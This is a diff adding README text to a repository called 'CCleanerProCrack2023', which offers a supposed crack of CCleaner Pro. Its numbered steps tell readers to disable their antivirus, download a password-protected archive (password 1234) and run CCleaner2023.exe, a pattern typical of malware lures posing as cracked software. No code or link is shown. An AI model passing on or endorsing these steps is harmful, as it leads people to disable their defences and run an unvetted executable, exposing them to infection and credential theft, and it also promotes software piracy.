@@ -1,1 +1,19 @@
 # CCleanerProCrack2023
+
+
+    THANK YOU FOR DOWNLOADING!!!!
+
+
+    PLEASE FOLLOW ALL INSTRUCTIONS
+
+
+
+    📕 DISABLE ANTIVIRUS
+
+    📘 DOWNLOAD THE ARCHIVE
+
+    📗 UNZIP IN FOLDER
+
+    📓 PASSWORD: 1234
+
+    📙 RUN CCleaner2023.exe
